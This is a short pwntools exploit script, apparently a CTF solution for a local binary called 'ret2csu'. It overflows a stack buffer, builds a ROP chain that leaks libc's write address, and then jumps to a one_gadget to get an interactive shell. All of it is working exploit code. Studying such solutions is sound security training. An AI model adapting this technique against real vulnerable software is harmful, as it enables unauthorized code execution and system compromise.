#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./ret2csu')
lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')

padding = 'a'*136

pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40075a
csu_addr = 0x400740
write_got = 0x601018
write_plt = 0x400520
vuln_addr = 0x400698
write_off = lib.symbols['write']
pop_rdi_ret = 0x0000000000400763
pop_rsi_r15_ret = 0x0000000000400761

r.recvuntil('hello ret2csu!\n')

# write(rdi=1, rsi=write_got, rdx=0x200)
rop = flat(
    pop_rdi_ret , 0x1 , pop_rsi_r15_ret ,
    write_got , 0xdeadbeef , write_plt
)

# when ret , rdx = 0x200
r.sendline(padding + rop + p64(vuln_addr))

libc_addr = u64(r.recv(8)) - write_off
print '[*] libc addr : ',hex(libc_addr)

one_gadget = libc_addr + 0x10a38c

r.sendline(padding + p64(one_gadget))

r.interactive()
